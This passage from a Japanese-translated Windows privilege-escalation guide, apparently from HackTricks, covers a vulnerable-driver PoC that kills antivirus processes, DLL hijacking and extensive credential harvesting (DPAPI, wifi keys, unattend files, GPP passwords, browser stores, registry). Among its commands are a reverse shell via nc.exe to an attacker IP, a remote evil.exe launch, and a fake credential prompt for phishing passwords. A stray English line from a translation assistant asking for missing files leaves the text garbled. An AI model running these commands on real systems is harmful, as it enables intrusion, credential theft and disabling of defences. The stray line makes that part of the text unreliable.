- 任意プロセスに対するフルアクセスハンドルを返す（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 制限なしの raw disk read/write（オフライン改ざん、ブート時永続化の手法）。
- Protected Process/Light (PP/PPL) を含む任意のプロセスを終了させることで、ユーザランドから kernel 経由で AV/EDR kill を可能にする。

最小 PoC パターン (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
開発者向けの緩和策
- DACL で制限することを意図したデバイスオブジェクトを作成する際は、常に FILE_DEVICE_SECURE_OPEN を設定する。
- 特権操作では呼び出し元コンテキストを検証する。プロセス終了やハンドル返却を許可する前に PP/PPL チェックを追加する。
- IOCTLs を制限する（access masks、METHOD_*、入力検証）とともに、直接的なカーネル権限の付与ではなく brokered models を検討する。

防御者向けの検出アイデア
- 疑わしいデバイス名（e.g., \\ .\\amsdk*）への user-mode opens や、悪用を示す特定の IOCTL シーケンスを監視する。
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) を適用し、独自の allow/deny リストを維持する。

## PATH DLL Hijacking

PATH に含まれるフォルダ内に**書き込み権限がある**と、プロセスがロードする DLL をハイジャックして**escalate privileges**できる可能性があります。

PATH 内のすべてのフォルダの権限を確認する:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については：

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## ネットワーク

### 共有
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file にハードコードされた他の既知のコンピュータを確認する
```
type C:\Windows\System32\drivers\etc\hosts
```
### ネットワークインターフェースとDNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 開いているポート

外部から**制限されたサービス**を確認する
```bash
netstat -ano #Opened ports?
```
### ルーティングテーブル
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP テーブル
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ファイアウォールのルール

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(ルールの一覧、ルールの作成、無効化、無効化...)**

さらに[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
バイナリ `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にも存在します

rootユーザーを取得すれば任意のポートでリッスンできます（`nc.exe` を使ってポートでリッスンするのは初回のみ、`nc` をファイアウォールで許可するかどうかを GUI で確認されます）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
簡単に bash を root として起動するには、`--default-user root` を試してください

フォルダ `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` で `WSL` のファイルシステムを参照できます。

## Windows 認証情報

### Winlogon 認証情報
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault は、サーバー、ウェブサイト、その他のプログラム用のユーザー資格情報を保存します。これらは **Windows** が **ユーザーを自動的にログインさせる**y ことができるものです。最初は、ユーザーが Facebook、Twitter、Gmail などの資格情報を保存してブラウザ経由で自動的にログインできるように見えるかもしれません。しかし、そうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせる資格情報を保存します。つまり、リソース（サーバーやウェブサイト）にアクセスするために資格情報を必要とする任意の **Windows application that needs credentials to access a resource** は **この Credential Manager を利用することができ** & Windows Vault を利用して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに提供された資格情報を使用できます。

アプリケーションが Credential Manager とやり取りしない限り、特定のリソース用の資格情報を使用することはできないと考えられます。したがって、アプリケーションが vault を利用したい場合は、デフォルトのストレージ vault からそのリソースの資格情報を取得するために **credential manager と通信し、そのリソースの資格情報を要求する** 必要があります。

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
その後、保存された資格情報を使用するために `runas` を `/savecred` オプションと共に使用できます。以下の例は SMB share 経由でリモートバイナリを呼び出す例です。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
提供された資格情報のセットで `runas` を使用する。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** は、主に Windows オペレーティングシステム内で非対称プライベートキーを対称的に暗号化するために使用される、データの対称暗号化方式を提供します。この暗号化は、エントロピーに大きく寄与するユーザーまたはシステムのシークレットを利用します。

DPAPI は、ユーザーのログインシークレットから導出される対称鍵を用いて鍵を暗号化できるようにします。システム暗号化のシナリオでは、システムのドメイン認証シークレットを利用します。

DPAPI を用いて暗号化されたユーザーの RSA キーは、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を示します。**DPAPI キーは、ユーザーのプライベートキーを保護するマスターキーと同じファイルに共置されており、** 通常は 64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されており、CMD の `dir` コマンドでは内容を一覧できませんが、PowerShell では一覧可能である点に注意してください。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用してそれを復号できます。

通常、**credentials files protected by the master password** は以下にあります:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
root の場合、`sekurlsa::dpapi` module を使用して **メモリ** から多数の **DPAPI** **masterkeys** を抽出できます。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 認証情報

**PowerShell credentials** は、暗号化された認証情報を便利に保存する手段として、**scripting** や自動化タスクでよく使われます。認証情報は **DPAPI** によって保護されており、通常は作成された同じユーザが同じコンピュータ上でのみ復号できます。

含まれるファイルから PS 認証情報を**復号する**には、次のようにします:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 保存された RDP 接続

これらは `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近実行したコマンド
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **リモート デスクトップ資格情報マネージャー**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
適切な `/masterkey` を指定して、**Mimikatz** の `dpapi::rdg` モジュールを使用すると、任意の .rdg ファイルを **復号** できます。  
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
Mimikatz の `sekurlsa::dpapi` モジュールを使えば、メモリから多くの DPAPI マスターキーを **抽出** できます。

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.  
多くの人が Windows ワークステーションで StickyNotes アプリを使って、これがデータベースファイルであることに気づかずに**パスワード**やその他の情報を保存しています。  
このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、常に検索して調査する価値があります。

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
**AppCmd.exe** からパスワードを回復するには、Administrator 権限で High Integrity レベルで実行する必要があることに注意してください。  
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。  
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.  
このファイルが存在する場合、何らかの **credentials** が設定されており、**復元**できる可能性があります。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認する .\
インストーラは **run with SYSTEM privileges**, 多くは **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## ファイルとレジストリ (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH ホストキー
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### レジストリ内の SSH キー

SSH の秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` 内に保存されていることがあるため、そこに興味深いものがないか確認してください:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
そのパス内にエントリが見つかった場合、それはおそらく保存された SSH key です。暗号化されて保存されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使用すれば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

`ssh-agent` service が動作しておらず、起動時に自動的に開始させたい場合は、次を実行します:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> この手法はもう有効ではないようです。いくつかの ssh keys を作成し、`ssh-add` で追加して、ssh を使ってマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、非対称鍵認証の間に procmon は `dpapi.dll` の使用を検出しませんでした。

### 放置されたファイル
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
これらのファイルは**metasploit**でも検索できます: _post/windows/gather/enum_unattend_

例の内容:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM のバックアップ
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### クラウド認証情報
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

ファイル名が **SiteList.xml** のファイルを検索してください

### Cached GPP Pasword

以前、Group Policy Preferences (GPP) を使って複数のマシンにカスタムのローカル管理者アカウントを配布できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして格納される Group Policy Objects (GPOs) は任意のドメインユーザーがアクセス可能でした。第二に、これらの GPP 内のパスワードは公開されているデフォルトキーを用いた AES256 で暗号化されていましたが、認証済みユーザーであれば復号可能でした。これにより、ユーザーが権限昇格を行える重大なリスクが生じていました。

このリスクを軽減するため、ローカルにキャッシュされた GPP ファイルをスキャンし、"cpassword" フィールドが空でないものを検出する関数が作られました。該当するファイルが見つかると、その関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、脆弱性の特定と修復に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ にある次のファイルを検索してください:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec を使用してパスワードを取得する:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS の Web構成
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
資格情報を含む web.config の例:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 認証情報
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials を尋ねる

ユーザーがそれを知っていると思われる場合、常に**ユーザーに自身のcredentials、あるいは別のユーザーのcredentialsさえ入力するよう依頼する**ことができます（ただし、クライアントに直接**依頼する**ことで**credentials**を求めるのは非常に**危険**である点に注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials を含む可能性のあるファイル名**

以前、**passwords** が **clear-text** または **Base64** で含まれていた既知のファイル
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md or the list of "proposed files." Please paste the file(s) you want translated (or provide a list/paths). I'll translate the English text to Japanese following your rules.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin の資格情報

Bin も確認して、その中に資格情報がないか探してください

いくつかのプログラムに保存された **パスワードを復元する** には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**資格情報を含むその他のレジストリキー**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザの履歴

**Chrome or Firefox** のパスワードが保存されている db を確認してください。\
ブラウザの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている場合があります。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は、Windows オペレーティングシステムに組み込まれた技術で、異なる言語のソフトウェアコンポーネント間の**相互通信**を可能にします。各 COM コンポーネントは**class ID (CLSID) によって識別**され、各コンポーネントは1つ以上のインターフェイスを通じて機能を公開し、インターフェイスは interface ID (IIDs) で識別されます。

COM クラスとインターフェイスはレジストリの **HKEY\CLASSES\ROOT\CLSID** および **HKEY\CLASSES\ROOT\Interface** にそれぞれ定義されています。このレジストリは **HKEY\LOCAL\MACHINE\Software\Classes** と **HKEY\CURRENT\USER\Software\Classes** をマージして作成され、結果が **HKEY\CLASSES\ROOT** になります。

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

基本的に、実行される **DLL のいずれかを上書き**できれば、その DLL が別のユーザによって実行される場合に **権限昇格** が可能になります。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルおよびレジストリ内での一般的なパスワード検索**

**ファイル内容の検索**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を持つファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf プラグインです**。このプラグインは、**被害者内で資格情報を検索するすべての metasploit POST モジュールを自動的に実行する**ために作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) このページで言及されている、パスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出するもう一つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータを平文で保存する複数のツール（PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP）の **sessions**, **usernames** and **passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

例えば、**SYSTEMとして実行されているプロセスが新しいプロセスを開く** (`OpenProcess()`) とし、その際**full access**が付与されているとします。  
同じプロセスが (`CreateProcess()`) を使って、**低い権限だがメインプロセスの全てのオープンハンドルを継承する**新しいプロセスも**作成する**。\
その場合、**低権限プロセスに対して full access を持っていれば**、`OpenProcess()` で開かれた特権プロセスへの**open handle**を取得し、**shellcode を注入する**ことができます。\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

共有メモリセグメント、通称**pipes**は、プロセス間の通信やデータ転送を可能にします。

Windowsは**Named Pipes**という機能を提供しており、関連のないプロセス間でも、場合によっては異なるネットワーク上でもデータを共有できます。これはクライアント/サーバーのアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**として定義されます。

クライアントがパイプを通じてデータを送信すると、そのパイプを設定した**server**は、必要な**SeImpersonate**権限がある場合、**client の identity を引き継ぐ（インパーソネーションする）**ことができます。模倣可能なパイプ経由で通信する**privileged process**を特定できれば、そのプロセスがあなたの作成したパイプとやり取りする際にそのアイデンティティを採用して**より高い権限を得る**機会が生まれます。  
この種の攻撃の実行手順については、[**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system) に参考になるガイドがあります。

